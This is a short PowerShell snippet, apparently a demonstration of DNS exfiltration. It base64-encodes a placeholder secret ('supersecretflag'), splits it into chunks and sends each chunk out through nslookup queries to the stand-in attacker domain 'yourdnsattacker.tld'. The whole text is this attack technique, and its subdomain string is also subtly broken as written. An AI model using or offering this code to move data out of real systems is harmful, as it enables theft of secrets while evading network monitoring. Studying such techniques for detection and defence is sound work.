$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("supersecretflag"));
$data -split "(?<=\G.{50})" | % {
  nslookup $_.yourdnsattacker.tld
}

